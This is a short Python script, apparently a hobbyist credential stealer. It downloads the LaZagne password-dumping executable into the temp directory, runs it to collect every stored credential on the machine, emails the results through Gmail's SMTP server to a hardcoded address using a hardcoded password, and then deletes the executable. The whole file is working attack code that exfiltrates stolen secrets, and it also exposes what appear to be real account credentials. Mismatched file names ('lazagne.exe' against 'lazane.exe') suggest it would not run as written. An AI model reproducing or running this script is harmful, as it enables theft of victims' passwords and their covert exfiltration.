#!/urs/bin/env python
import requests, subprocess,smtplib, os, tempfile

def download(url):
	get_response= requests.get(url)
	file_name = url.split("/")[-1]
	with open(str(file_name),"wb") as out_file:
		out_file.write(get_response.content)

def send_mail(email, password, msg):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, msg)
	server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")#lazane link
result = subprocess.check_output("lazane.exe all",shell=True)
send_mail("neupaneyamuna@gmail.com","sulavsugamad",result)
os.remove("laZane.exe")
